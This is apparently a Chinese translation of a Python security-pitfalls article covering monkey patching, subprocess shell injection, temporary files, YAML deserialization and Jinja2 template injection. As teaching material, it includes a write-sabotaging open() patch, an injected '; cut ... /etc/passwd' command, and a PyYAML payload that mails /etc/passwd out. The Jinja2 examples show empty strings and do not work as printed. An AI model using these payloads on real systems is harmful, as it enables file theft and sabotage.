# Monkey patching
运行时更改 Python 对象属性的过程称为 Monkey
patching。作为一种动态语言，Python完全支持运行时程序自省和代码变异。一旦恶意模块以一种或另一种方式导入，任何现有的可变对象都可能在未经程序员同意的情况下被愚蠢地修改。
    $cat nowrite.py
    import builtins
    def malicious_open(*args, **kwargs):
        if len(args) > 1 and args[1] == 'w':
            args = ('/dev/null',) + args[1:]
        return original_open(*args, **kwargs)
    original_open, builtins.open = builtins.open, malicious_open
如果上面的代码由Python解释器执行，则写入文件的所有内容都不会存储在文件系统中。而在Python
3中，对True和False的赋值将不起作用，因此无法以这种方式进行操作。
    >>> __builtins__.False, __builtins__.True = True, False
    >>> True
    False
    >>> int(True)
    0
函数是Python中的一级对象，它的代码对象通过__code__属性访问，该属性当然可以修改
    >>> import shutil
    >>>
    >>> shutil.copy
    >>> shutil.copy.__code__ = (lambda src, dst: dst).__code__
    >>>
    >>> shutil.copy('my_file.txt', '/tmp')
    '/tmp'
    >>> shutil.copy
    >>>
一旦应用了以上的Monkey patching，尽管shutil.copy函数仍然看起来很健全，但由于设置了no-op
lambda函数代码，它默默地停止了工作。
Python对象的类型由__class__属性确定。 攻击者可能会通过改变活动对象的类型来进行攻击
    >>> class X(object): pass
    ... 
    >>> class Y(object): pass
    ... 
    >>> x_obj = X()
    >>> x_obj
    >>> isinstance(x_obj, X)
    True
    >>> x_obj.__class__ = Y
    >>> x_obj
    >>> isinstance(x_obj, X)
    False
    >>> isinstance(x_obj, Y)
    True
    >>>
# Shell injection via subprocess
Python 作为一种胶水语言，Python 脚本通过要求操作系统执行它们来将系统管理任务委托给其他程序是很普遍的。subprocess
模块为此类任务提供了易于使用的高级服务。
    >>> from subprocess import call
    >>> unvalidated_input = '/bin/true'
    >>> call(unvalidated_input)
    0
    >>>
但是有一个问题。要使用 UNIX shell 服务(例如命令行参数扩展)，应将 call 函数的shell
关键字参数设置为True。然后将调用函数的第一个参数原样传递给系统 shell ，以进行进一步的解析和解释。
一旦未经验证的用户输入到达调用功能(或子流程模块中实现的其他功能)，便会产生漏洞。
    >>> from subprocess import call
    >>> unvalidated_input = '/bin/true'
    >>> unvalidated_input += '; cut -d: -f1 /etc/passwd'
    >>> call(unvalidated_input, shell=True)
    root
    daemon
    bin
    sys
    sync
    games
    man
    lp
    mail
    news
    ......
    0
通过将 shell 关键字保留为默认的 False 状态并将命令向量及其参数提供给子进程函数，不调用 UNIX shell
来执行外部命令显然要安全得多。在第二种调用形式中，shell既不解释也不扩展命令或其参数
    >>> from subprocess import call
    >>> call(['/bin/ls', '/'])
    bin   etc         initrd.img.old  lost+found  opt   run   sys  var
    boot  home        lib             media       proc  sbin  tmp  vmlinuz
    dev   initrd.img  lib64           mnt         root  srv   usr  vmlinuz.old
    0
如果应用程序的性质决定了使用 UNIX Shell 服务，则彻底清除子进程中的所有内容以确保恶意用户不会利用不需要的Shell功能是绝对重要的。在较新的
Python 版本中，可以使用标准库的 `shlex.quote` 函数完成 shell 转义
# Temporary files
尽管基于对临时文件的不当使用的漏洞攻击了许多编程语言，但它们在Python脚本中很常见。
这种漏洞利用了不安全的文件系统访问权限，可能涉及中间步骤，最终导致数据机密性或完整性问题。有关该问题的详细说明，请参见[CWE-377](http://cwe.mitre.org/data/definitions/377.html)。
幸运的是，Python在其标准库中增加了 tempfile 模块，该模块提供了高级功能，可以 "以尽可能最安全的方式" 创建临时文件名。当心有缺陷的
tempfile.mktemp 库，由于向后兼容的原因，该实现仍存在于库中。绝对不能使用tempfile.mktemp函数，而是使用
tempfile.TemporaryFile 或 tempfile.mkstemp(如果您需要临时文件在关闭后保留)。
另一种造成漏洞的可能方式是使用 shutil.copyfile 函数。这里的问题是目标文件是以最不安全的方式创建的。
开发人员可能会考虑先将源文件复制到随机的临时文件名，然后将临时文件重命名为其最终名称。如果将其用于执行重命名，则可以通过 shutil.move
函数使其变得不安全。如果临时文件是在最终文件所在的文件系统以外的文件系统上创建的，shutil.move将无法通过 os.rename
移动它，并且会静默地求助于不安全的 shutil.copy 。由于 shutil.copy
无法复制所有文件元数据而可能导致进一步的复杂性，从而可能使创建的文件不受保护。
# Insecure deserialization
目前存在许多数据序列化技术，其中Pickle专为对Python对象进行反序列化而设计。它的目标是将活动的Python对象转储到八位字节流中以进行存储或传输，然后将其重构回可能的另一个Python实例。
如果篡改了序列化的数据，则重建步骤具有固有的风险。 Pickle的不安全性在Python文档中得到了很好的认识并得到了明确记录。
作为一种流行的配置文件格式，YAML不一定被认为是能够欺骗解串器执行任意代码的强大序列化协议。但是，事实上 python中实现 YAML 的默认库
PyYAML 是存在风险的。
    >>> import yaml
    >>>
    >>> dangerous_input = """
    ... some_option: !!python/object/apply:subprocess.call
    ...   args: [cat /etc/passwd | mail PI:EMAIL]
    ...   kwds: {shell: true}
    ... """
    >>> yaml.load(dangerous_input)
    {'some_option': 0}
建议的解决方案是始终使用 yaml.safe_load 来处理您不信任的YAML序列化。
# Templating engines
Web应用程序作者很早以前就采用Python。在过去的十年中，已经开发了许多Web框架。他们中的许多人利用模板引擎从模板和运行时变量生成动态Web内容。除了Web应用程序之外，模板引擎还进入了完全不同的软件中，例如Ansible
IT自动化工具。
从静态模板和运行时变量呈现内容时，存在通过运行时变量进行用户控制的代码注入的风险。对Web应用程序成功发起的攻击可能会导致跨站点脚本漏洞。服务器端模板注入的通常解决措施是在将模板变量插值到最终文档之前对其进行清理。可以通过拒绝，剥离或转义任何给定标记或其他特定于域的语言的特殊字符来进行清理。
不幸的是，模板引擎似乎不默认使用转义机制
    >>> from jinja2 import Environment
    >>>
    >>> template = Environment().from_string('')
    >>> template.render(variable='')
    ''
如果使用转义机制
    >>> from jinja2 import Environment
    >>>
    >>> template = Environment(autoescape=True).from_string('')
    >>> template.render(variable='')
    ''
另一个复杂之处是，在某些案例中，程序员不希望清理所有模板变量，有意地保留其中一些保留潜在危险内容的模板。 模板引擎通过引入 "过滤器"
来满足程序员的需求，使程序员可以明确地清理各个变量的内容。